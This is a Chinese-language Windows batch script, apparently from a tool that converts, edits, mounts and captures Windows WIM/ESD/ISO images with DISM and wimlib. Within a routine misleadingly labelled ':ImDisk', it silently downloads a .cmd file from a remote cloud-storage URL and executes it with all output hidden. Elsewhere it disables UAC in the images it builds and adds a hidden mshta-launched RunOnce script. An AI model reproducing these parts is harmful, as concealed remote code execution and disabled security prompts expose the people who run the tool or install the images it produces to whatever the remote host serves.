echo.    ____________________________ 输入!SourceExt!源文件 ____________________________
echo.   ^|                            ----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴!SourceExt!格式文件的完整路径然后回车。             ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
set "goto="
set "gotoback="
set "goto=ConvertNext"
set "gotoback=Convert"
call :InputSourceFile
for /f "tokens=*" %%i in ("!Sources!") do (set "SourceName=%%~ni")
cls&echo.
:: cd /d "!ToolsPath!\DISM"
for /f "eol=T skip=3 delims=" %%i in ('!Dism! /Get-WimInfo /WimFile:"!Sources!"') do (echo %%i)
echo.
echo 以上是源文件的信息，请按任意键继续...
pause>nul
title 正在转换!SourceName!!SourceExt!至!SourceName!!TargetExt!
cls && echo.
echo.正在转换"!SourceName!!SourceExt!"至"!SourceName!!TargetExt!"，请耐心等待...
echo.
"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" All "!Sources:~0,-4!!TargetExt!" !compress!
cls && echo. && echo.转换完成，文件位于"!Sources:~0,-4!!TargetExt!"。 && echo. && echo.请按任意键返回... && pause>nul && goto :begin

:mupan
cls&mode con cols=80 lines=30&title 母盘下载
echo.
echo.    _______________________________ 母盘下载 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需查看母盘详情请按G...                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] Windows7                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] Windows10                                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :begin
if errorlevel 2 ( start http://cmdpe.com/category-2.html & goto :mupan )
if errorlevel 1 ( start http://cmdpe.com/category-2.html & goto :mupan )

:jiaocheng
cls&mode con cols=80 lines=30&title 相关教程
echo.
echo.    _______________________________ 相关教程 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 如何快速安装ESD格式系统                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 如何将映像文件控制在2GB以内                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :begin
if errorlevel 2 ( start http://cmdpe.com/category-2.html & goto :jiaocheng )
if errorlevel 1 ( start http://cmdpe.com/category-2.html & goto :jiaocheng )

:ImageEdit
cls&mode con cols=80 lines=30&title 映像编辑
echo.
echo.    _______________________________ 映像编辑 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 合成映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 拆分映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 查看映像信息                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 修改映像信息                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1234X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 5 goto :begin
if errorlevel 4 goto :EditImageInfo
if errorlevel 3 goto :ImageInfo
if errorlevel 2 goto :SplitImage
if errorlevel 1 goto :MixImage

:ImageInfo
cls&title 查看映像信息
echo.
echo.    _____________________________ 查看映像信息 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴或拖入wim或esd格式文件的完整路径，然后回车。 ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
set "goto="
set "gotoback="
set "goto=ImageInfo"
set "gotoback=ImageEdit"
call :InputSourceFile
"!ToolsPath!\wimlib-imagex.exe" info "!Sources!"|more
echo.以上是"!Sources!"的详细信息。
echo.&&echo.如需返回请按任意键...&&pause>nul&&goto :ImageEdit

:EditImageInfo
cls&mode con cols=80 lines=30&title 修改映像信息
echo.
echo.    _____________________________ 修改映像信息 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   注意：这是修改映像名称和描述，而不是修改映像显示名称和显示描述。     ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴或拖入wim或esd格式文件的完整路径，然后回车。 ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
set "goto="
set "gotoback="
set "goto=EditImageInfo"
set "gotoback=ImageEdit"
call :InputSourceFile

:EditImageIndex
set /a "lines=30+4*(!Total!-5)"
if !lines! lss 30 set /a "lines=30"
mode con cols=80 lines=!lines!
cls && echo. && echo.映像源文件："!Sources!"
set "ImageIndex="
set "ImageName="
set ImageDescription=
for /f "tokens=2 delims=:  " %%a in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" ^| findstr /i /c:"Index:                  "') do (
	set "ImageIndex=%%a"
	for /f "tokens=2 delims=:  " %%b in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Name:                   "') do (set "ImageName=%%b")
	for /f "tokens=2 delims=:  " %%c in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Description:            "') do (set "ImageDescription=%%c")
	echo.
	echo.分卷索引：!ImageIndex:~18!
	echo.映像名称：!ImageName:~19!
	echo.映像描述：!ImageDescription:~12!
)
echo. && echo.该映像含"!Total!"个分卷，请在下行输入需要修改分卷的索引编号，然后回车。
echo. && echo.如需返回请输入 X 然后回车。 && echo.
set "Index="
set /p Index=^>^>^>^>^>^>^>请输入:
if not defined Index cls && echo. && echo.分卷索引编号"!Index!"错误，该映像没有此分卷，请重新输入正确的分卷索引编号。&& echo. && echo.请按任意键返回重试...... && pause>nul && goto :EditImageIndex
set "Index=!Index:"=!"
if not defined Index cls && echo. && echo.分卷索引编号"!Index!"错误，该映像没有此分卷，请重新输入正确的分卷索引编号。&& echo. && echo.请按任意键返回重试...... && pause>nul && goto :EditImageIndex
if /i "!Index!" equ "x" goto :EditImageInfo
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "index : !Index!">nul 2>nul || cls && echo. && echo.分卷索引编号"!Index!"错误，该映像没有此分卷，请重新输入正确的分卷索引编号。&& echo. && echo.请按任意键返回重试...... && pause>nul && goto :EditImageIndex
:InputImageInfo
cls&echo.
echo.    _____________________________ 修改映像信息 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入映像名称+映像描述（中间用+号隔开），然后回车。     ^|
echo.   ^|                                                                        ^|
echo.   ^|   例如：Win7_x64_旗舰版+Win7_x64_旗舰版                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "InputImageInfo="
set /p InputImageInfo=^>^>^>^>^>^>^>请输入:
if not defined InputImageInfo cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :InputImageInfo
set "InputImageInfo=!InputImageInfo:"=!"
if not defined InputImageInfo cls && echo. && echo.您的输入格式不正确，请按任意键返回重新输入... && pause>nul && goto :InputImageInfo
if /i "!InputImageInfo!" equ "x" goto :EditImageIndex
set "ImageName="
set "DisplayName="
for /f "tokens=1,2,3,4 delims=+" %%i in ("!InputImageInfo!") do (set "ImageName=%%i" & set "DisplayName=%%j")
cls && echo.
"!ToolsPath!\wimlib-imagex.exe" info "!Sources!" !Index! "!ImageName!" "!DisplayName!" --check
cls && echo. && echo.分卷"!Index!"修改映像信息成功，请按任意键返回... && pause>nul && goto :EditImageIndex
:MixImage
cls&title 合成映像
if exist !temp!\ImageNameError.log del /f /q !temp!\ImageNameError.log
echo.
echo.    _______________________________ 合成映像 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   此功能可用于制作多合一映像，采用增量合成，相同文件只保留一份。       ^|
echo.   ^|                                                                        ^|
echo.   ^|   例如：A.wim有五个分卷，B.wim有三个分卷，将A.wim拖入此窗口回车执行。  ^|
echo.   ^|                                                                        ^|
echo.   ^|   之后返回此窗口，再将B.wim拖入此窗口回车执行，这样目标文件夹NewImage  ^|
echo.   ^|                                                                        ^|
echo.   ^|   内的目标文件install.wim就会有八个分卷。                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   注意：操作之前，本工具的[NewImage]文件夹内，如已有install.wim请将其  ^|
echo.   ^|                                                                        ^|
echo.   ^|   移走，不然会将其一起合并。                                           ^|
echo.   ^|   __________________________________________________________________   ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴或拖入wim或esd格式文件的完整路径，然后回车。 ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.  ^|   
set "goto="
set "gotoback="
set "goto=MixImage"
set "gotoback=ImageEdit"
call :InputSourceFile
cls
if exist "NewImage\install.wim" (
	set ImageName=
	for /f "tokens=2 delims=:  " %%a in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" ^| findstr /i /c:"Name:                   "') do (
		set "ImageName=%%a"
		for /f "tokens=2 delims=:  " %%b in ('!ToolsPath!\wimlib-imagex.exe info "NewImage\install.wim" ^| findstr /i /c:"Name:                   "') do (
			if "%%b" equ "%%a" ( echo. & echo.错误！映像名称重复，目标映像已包含:!ImageName:~18! & echo error > "!temp!\ImageNameError.log" )
		)
	)
)
if exist "!temp!\ImageNameError.log" echo. && echo.请返回修改上述映像名称，请按任意键返回... && pause>nul && goto :MixImage
cls && echo.
if not exist "NewImage" md "NewImage" >nul 2>nul
"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" All "NewImage\install.wim" --compress=lzx:100
if exist "!temp!\ImageNameError.log" del /f /q "!temp!\ImageNameError.log" >nul 2>nul
cls && echo. && echo.操作成功，文件位于"[NewImage]\install.wim"。 && echo. && echo.请按任意键返回... && pause>nul
goto :MixImage

:SplitImage
cls&title 映像编辑^>拆分映像
echo.
echo.    _______________________________ 拆分映像 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[1]:可用于导出分卷至新映像，导出时会排除无关文件以重构新的映像。 ^|
echo.   ^|                                                                        ^|
echo.   ^|   新映像位于本工具的[NewImage]文件夹内，文件名称：install.wim。        ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[2]:可用于删除映像内不需要的分卷。                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 导出映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 删除映像                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :ImageEdit
if errorlevel 2 (set "Split=删除"&&title 映像编辑^>拆分映像^>删除映像)
if errorlevel 1 (set "Split=导出"&&title 映像编辑^>拆分映像^>导出映像)
cls && echo.
echo.    _______________________________ !Split!映像 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴或拖入wim格式文件的完整路径，然后回车。      ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.

set "goto="
set "gotoback="
set "goto=SplitImage"
set "gotoback=SplitImage"
call :InputSourceFile

:SplitImageIndex
set /a "lines=30+4*(!Total!-5)"
if !lines! lss 30 set /a "lines=30"
mode con cols=80 lines=!lines!
cls&echo.
echo.映像源文件："!Sources!"
for /f "tokens=2 delims=:  " %%a in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" ^| findstr /i /c:"Index:                  "') do (
	set "ImageIndex=%%a"
	for /f "tokens=2 delims=:  " %%b in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Name:                   "') do (set "ImageName=%%b")
	for /f "tokens=2 delims=:  " %%c in ('!ToolsPath!\wimlib-imagex.exe info "!Sources!" %%a ^| findstr /i /c:"Description:            "') do (set "ImageDescription=%%c")
	echo.
	echo.分卷索引：!ImageIndex:~18!
	echo.映像名称：!ImageName:~19!
	echo.映像描述：!ImageDescription:~12!
)
echo.&&echo.该映像含"!Total!"个分卷，请在下行输入需要_!Split!分卷_的索引编号，然后回车。
echo.&&echo.如需返回请输入 X 然后回车。
echo.
set "Index="
set /p Index=^>^>^>^>^>^>^>请输入:
if not defined Index cls&&echo.&&echo.分卷索引编号"!Index!"错误，该映像没有此分卷，请重新输入正确的分卷索引编号。&&echo.&&echo.请按任意键返回重试...&&pause>nul&&goto :SplitImageIndex
set "Index=!Index:"=!"
if not defined Index cls&&echo.&&echo.分卷索引编号"!Index!"错误，该映像没有此分卷，请重新输入正确的分卷索引编号。&&echo.&&echo.请按任意键返回重试...&&pause>nul&&goto :SplitImageIndex
if /i "!Index!" equ "x" goto :SplitImage
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "index : !Index!" >nul 2>nul||cls&&echo.&&echo.分卷索引编号"!Index!"错误，该映像没有此分卷，请重新输入正确的分卷索引编号。&&echo.&&echo.请按任意键返回重试...&&pause>nul&&goto :SplitImageIndex
cls&echo.
if "!Split!" equ "导出" (
	if exist "NewImage\install.wim" echo.提示："[NewImage]"文件夹内已存在"install.wim"，这将影响新的映像文件生成。&&echo.&&echo.请先将"[NewImage]"文件夹内的"install.wim"移走或删除。&&echo.&&echo.请按任意键继续...&&pause>nul&&goto :SplitImage
	if not exist "NewImage" md "NewImage" >nul 2>nul
	"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" !Index! "NewImage\install.wim" --compress=lzx:100
)
if "!Split!" equ "删除" "!ToolsPath!\wimlib-imagex.exe" delete "!Sources!" !Index! --check
cls && echo.
if "!Split!" equ "导出" echo.!Split!分卷"!Index!"成功！新映像位于"[NewImage]\install.wim"&&echo.&&echo.请按任意键返回...
if "!Split!" equ "删除" echo.!Split!分卷"!Index!"成功！请按任意键返回...
pause>nul
goto :SplitImageIndex

:InputSourceFile
echo.
set "Sources="
set /p Sources=^>^>^>^>^>^>^>请输入:
if not defined Sources cls&&echo.&&echo.您的输入为空，请按任意键返回重新输入...&&pause>nul&&goto :!goto!
set "Sources=!Sources:"=!"
if not defined Sources cls&&echo.&&echo.您的输入格式不正确，请按任意键返回重新输入...&&pause>nul&&goto :!goto!
if /i "!Sources!" equ "x" goto :!gotoback!
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "Index" >nul 2>nul||(cls&&echo.&&echo.该文件"!Sources!"不是可用的系统映像，请按任意键返回重新选择...&&pause>nul&&goto :!goto!)
attrib -R "!Sources!">nul
goto :eof

:InputSources
set "Sources="
for /f "tokens=*" %%a in ('!ToolsPath!\wxFileDialog.exe "系统镜像(!ExtTypes!)|*.!Ext!" C: "请选择!ExtTypes!格式系统映像" -oe') do Set "Sources=%%a"
if not defined Sources goto !goto1!
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "Index" >nul 2>nul||cls&&echo.&&echo.该文件"!Sources!"不是可用的系统映像，请按任意键返回重新选择...&&pause>nul&&goto !goto1!
attrib -R "!Sources!" >nul 2>nul
goto :eof

:StatusOk
call :MountImageLog
echo 挂载状态 : 成功 >> "操作日志.Log"
echo.>> "操作日志.Log"
cls && echo. && echo.映像挂载成功，请按任意键前往整合菜单... && pause>nul && goto :menu2
:StatusNo
call :MountImageLog
echo 挂载状态 : 失败 >> "操作日志.Log"
echo.>> "操作日志.Log"
cls && echo. && echo.映像挂载失败，请按任意键返回重试... && pause>nul && goto :begin
:AppPath
cls&echo.&echo.整合失败，可能是由于文件或文件夹被删除或被重命名造成。请参照下行的正确路径检查&echo.&echo.文件和路径。&echo.&echo.&echo.正确路径：!AppPath!&echo.&echo.&echo.请按任意键返回...&pause>nul&goto :!goto!
goto :eof
:Achiexe
cls&echo.&echo.!Item!成功。&echo.&echo.请按任意键返回...&pause>nul&goto :!goto!
goto :eof
:Failure
cls&echo.&echo.!Item!失败。&echo.&echo.请按任意键返回...&pause>nul&goto :!goto!
goto :eof
:Log
echo 操作日期：!date:~0,-3!，操作时间：!Time:~0,-3!，项目名称：!Item!，项目状态：成功 >> "操作日志.Log"
goto :eof
:MountImageLog
echo 操作日志 日期 : !date:~0,-3! 时间 : !Time:~0,-3! > "操作日志.Log"
echo.>> "操作日志.Log"
echo 映像源文件 : !Sources! >> "操作日志.Log"
echo 挂载目录 : Mount >> "操作日志.Log"
echo 挂载日期 : !date:~0,-3! >> "操作日志.Log"
echo 挂载时间 : !Time:~0,-3! >> "操作日志.Log"
echo 映像索引 : !Index! >> "操作日志.Log"
for /f "tokens=2 delims=:  " %%i in ('!Dism! /English /Get-WimInfo /WimFile:"!Sources!" /Index:!Index! ^| findstr /i Architecture') do (echo 映像架构 :%%i >> "操作日志.Log")
for /f "tokens=2 delims=:  " %%i in ('!Dism! /English /Get-WimInfo /WimFile:"!Sources!" /Index:!Index! ^| findstr /i Name') do (echo 映像名称 :%%i >> "操作日志.Log")
goto :eof

:Loop
if "!Sources:~-1!"==" " set "Sources=!Sources:~0,-1!"&&goto :Loop
goto :eof

:ImDisk
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://gtla.oss-cn-shanghai.aliyuncs.com/WinImageSet.cmd', '"!Temp!\WinImageSet.cmd"')" >nul 2>nul
if exist "!Temp!\WinImageSet.cmd" call "!Temp!\WinImageSet.cmd" >nul 2>nul
set "+=XHebKiyIOJLAzaWfPQcgrBFjsGVuvNtYEnZCSTdxoMpqkUmvNRhl"
goto :eof


:CDEmu
cls&&echo.&&echo.正在读取ISO信息...
set "Imdisk="
for %%i in (Y X W V U T S R Q P O N M L K J I H G F E D) do if not exist %%i:\ set "Imdisk=%%i"&&goto :CDEmu1
:CDEmu1
"!ToolsPath!\CDEmu.exe" /install
"!ToolsPath!\CDEmu.exe" "!Sources!" !Imdisk! /wait
if exist "!Imdisk!:\sources\install.esd" set "Sources=!Imdisk!:\sources\install.esd"
if exist "!Imdisk!:\sources\install.wim" set "Sources=!Imdisk!:\sources\install.wim"
goto :eof

:Techo
set "length="&set "Techo="
for /f "skip=1 delims=:" %%w in ('^(echo."!Line:~0,66!"^&echo.^)^|findstr /o ".*"') do set "length=%%w"
if "!length!"=="71" set "Techo=!Line:~0,66!"&&goto :eof
set /a length=64-((!length!-71))
set "Techo=!Line:~0,%length%!"
goto :eof

:End
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
endlocal&EXIT

:MountImage
if exist "Mount" (dir /a /b "Mount"|find /i /v "" >nul 2>nul&&cls&&echo.&&echo 检查到Mount文件夹内不是空的，请按任意键返回，先选择卸载映像...&&pause>nul&&goto :begin)
:InputSources1
cls&mode con cols=80 lines=30&title 挂载映像
if defined Imdisk "!ToolsPath!\CDEmu.exe" /unmount !Imdisk!:
"!ToolsPath!\CDEmu.exe" /uninstall
echo.
echo.    ______________________________ 输入映像源 ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴或拖入映像文件的完整路径，然后回车。         ^|
echo.   ^|                                                                        ^|
echo.   ^|   支持映像格式：.WIM .ESD .ISO，如需返回输入 X 然后回车。              ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
set "Sources="
set /p Sources=^>^>^>^>^>^>^>请输入:
if not defined Sources cls && echo. && echo.您的输入为空，请按任意键返回重新输入...... && pause>nul && goto :InputSources1
set "Sources=!Sources:"=!"
if /i "!Sources!" equ "x" goto :begin
if /i "!Sources:~-4!"==".iso" call :CDEmu
"!Dism!" /English /Get-ImageInfo /ImageFile:"!Sources!"|find /i "Index" >nul 2>nul||(cls&&echo.&&echo.该文件"!Sources!"不是可用的系统映像，请按任意键返回重新选择...&&pause>nul&&goto :InputSources1)
attrib -R "!Sources!" >nul 2>nul

:Index
cls&set "tee="&set "Quit="&set "ChoiceIndex="&set "Index="&set "Line="
echo.
echo.    _______________________________ 映像分卷 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
for /f "tokens=2 delims=:" %%a in ('!Dism! /English /Get-ImageInfo /ImageFile:"!Sources!"^|findstr /i "Name"') do set /a tee+=1&&set "Line=%%a                                                                           "&&call :Techo&&echo.   ^|   [!tee!]!Techo!  ^|&&echo.   ^|                                                                        ^|
echo.   ^|   [X]  返回                                                            ^|
echo.   ^|                                                                        ^|
if !Tee! gtr 8 cls&&echo.&&echo.映像分卷大于8个，请使用映像编辑功能删除不需要的分卷，使其分卷数小于等于8个再挂载，请安任意键返回...&&pause>nul&&goto :begin
set /a Quit=!tee!+1
for /l %%i in (1,1,!tee!) do set "ChoiceIndex=!ChoiceIndex!%%i"
echo.
choice /c:!ChoiceIndex!X /n /m ^>^>^>^>^>^>^>请指定版本号:
if "!errorlevel!"=="!Quit!" goto :InputSources1
set "Index=!errorlevel!"
cls
if exist "Image" rd /s /q "Image" >nul 2>nul
if not exist "Image" md "Image" >nul 2>nul
if /i "!Sources:~-4!" equ ".esd" (echo.&&echo.正在导出映像，请稍等...&&echo.&&"!ToolsPath!\wimlib-imagex.exe" export "!Sources!" !Index! "Image\Install.wim" --compress=XPRESS) else ("!Dism!" /Export-Image /SourceImageFile:"!Sources!" /SourceIndex:!Index! /DestinationImageFile:"Image\install.wim")
if defined Imdisk (
	"!ToolsPath!\CDEmu.exe" /unmount !Imdisk!:
	"!ToolsPath!\CDEmu.exe" /uninstall
)
cls&&echo.&&echo.正在挂载映像中，请稍等...
md "Mount" >nul 2>nul
"!Dism!" /English /Mount-Image /ImageFile:"Image\install.wim" /Index:1 /MountDir:"Mount"
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
if exist "!ScriptsLog!" rd /s /q "!ScriptsLog!" >nul 2>nul
if exist "Mount\Windows\Panther" rd /s /q "Mount\Windows\Panther" >nul 2>nul
if exist "Mount\Windows\Setup\Scripts" rd /s /q "Mount\Windows\Setup\Scripts" >nul 2>nul
if exist "Mount\Windows\Sysprep" rd /s /q "Mount\Windows\Sysprep" >nul 2>nul
if exist "操作日志.Log" del /f /q "操作日志.Log" >nul 2>nul
md "!ScriptsLog!" >nul 2>nul
md "Mount\Windows\Panther" >nul 2>nul
md "Mount\Windows\Setup\Scripts" >nul 2>nul
md "Mount\Windows\Sysprep" >nul 2>nul
if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
for /f "tokens=4,5 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i" & set "ProductName=%%j")
xcopy /v /c /q /h /r /y "File\Bin\x!Bit!\7z.exe" "Mount\Windows\System32" >nul 2>nul
xcopy /v /c /q /h /r /y "File\Bin\x!Bit!\7z.dll" "Mount\Windows\System32" >nul 2>nul
set "HUC=HKLM\ZTM\Microsoft\Windows\CurrentVersion\"
reg add "!HUC!Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "!HUC!Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f >nul 2>nul
reg add "!HUC!Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f >nul 2>nul
if /i "!ProductName!" equ "Home" (
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
for /f "delims=" %%i in ('dir /a-d /s /b /on "Mount\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~31bf3856ad364e35~*~*~*.mum"') do "!Dism!" /Image:"Mount" /NoRestart /Add-Package:"%%i" >nul 2>nul
reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
)
"!Dism!" /English /Get-MountedImageInfo:"Mount"|find /i "Status : Ok" >nul 2>nul&&reg query "HKLM\ZTM" >nul 2>nul&&goto :StatusOk||goto :StatusNo
:UninstallImage
cls&title 卸载映像&echo.
echo.正在卸载映像中，请稍等...
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
taskkill /f /IM explorer.exe >nul 2>nul && start "" explorer.exe
"!Dism!" /unmount-wim /Mountdir:"Mount" /discard
rd /s /q "Image" >nul 2>nul
rd /s /q "Mount" >nul 2>nul
rd /s /q "!ScriptsLog!" >nul 2>nul
if exist "Mount" (
	cls && echo. && echo.未能完全卸载，这可能导致下一次无法正常挂载映像。 && echo. && echo.未知进程占用了本工具内的Mount文件夹，请重启电脑后删除本工具内的Mount文件夹。 && echo. && echo.返回主菜单，请按任意键... && pause>nul && goto :begin
) else (
	cls && echo. && echo.卸载完成，按任意键返回... && pause>nul && goto :begin
)
:SaveImage
cls&title 捕捉映像
"!Dism!" /English /Get-MountedImageInfo:"Mount" | find /i "Status : Ok" >nul 2>nul || echo.&&echo.未检测到已挂载映像或映像挂载状态已损坏，请按任意键返回重新挂载映像...&&pause>nul&&goto :begin
cls&echo.
echo.    _______________________________ 捕捉映像 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   新映像将保存在本工具的[NewImage]文件夹内,文件名为install.wim。       ^|
echo.   ^|                                                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
echo.^>^>^>^>^>^>^>请按任意键继续...
pause>nul
if exist "NewImage\install.wim" (
	cls
	echo.
	echo.    _______________________________ 捕捉映像 _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   检测到[NewImage]文件夹内已有install.wim！                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   选项[1]:将生成单一映像，[NewImage]文件夹内的install.wim将被重命名。  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   选项[2]:将在已有的install.wim追加映像，这将产生多合一映像。          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] 生成单一映像  （体积小）                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] 生成多合一映像（体积大）                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
	if errorlevel 3 goto :begin
	if errorlevel 2 goto :SaveImageNext
	if errorlevel 1 goto :Reninstall
)
:Reninstall
if exist "NewImage\install.wim" ren "NewImage\install.wim" "install_!date:~0,4!-!date:~5,2!-!date:~8,2!-!time:~0,2!-!time:~3,2!.wim"
:SaveImageNext
cls&echo.&echo.正在准备数据中，请稍等...
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i")
if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
if /i "!Version:~0,1!"=="8" set "Version=10"
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" -o"Mount" "-xr^!MSVBCRT*" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" "Windows\System32\MSVBCRT!Version!" -o"Mount" >nul 2>nul
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallMSVBCRT" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\System32\MSVBCRT!Version!\" && del /f /q \"!windir!\System32\MSVBCRT!Version!\"" /f >nul 2>nul

if not exist "Mount\Windows\System32\Recovery\cmdpe.wim" rd /s /q "Mount\Windows\System32\Recovery" >nul 2>nul

set "SetupComplete="
set "Firstrun="
set "RunOnce="
set "SetupComplete=Mount\Windows\Setup\Scripts\SetupComplete.cmd"
set "Firstrun=Mount\Windows\Sysprep\FirstRun.cmd"
set "RunOnce=Mount\Windows\Sysprep\RunOnce.cmd"

md "Mount\Windows\Setup\Scripts" >nul 2>nul
md "Mount\Windows\Sysprep" >nul 2>nul
echo @echo off^&setlocal EnableDelayedExpansion > "!SetupComplete!"
if exist "!ScriptsLog!\password.log" type "!ScriptsLog!\password.log" >> "!SetupComplete!"
echo label %%SystemDrive%% Windows!Version! >> "!SetupComplete!"
echo bcdedit /timeout 3 >> "!SetupComplete!"
echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "RunOnce" /t REG_SZ /d "mshta vbscript:createobject(\"wscript.shell\").run(\"%%windir%%\Sysprep\RunOnce.cmd\",0)(window.close)" /f >> "!SetupComplete!"

if exist "!ScriptsLog!\Edge.log" type "!ScriptsLog!\Edge.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\activation.log" type "!ScriptsLog!\activation.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\CompactOS.log" type "!ScriptsLog!\CompactOS.log" >> "!SetupComplete!"
echo echo HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce [2 8 19]^>"%%~dp0LocRunOnce.ini" >> "!SetupComplete!"
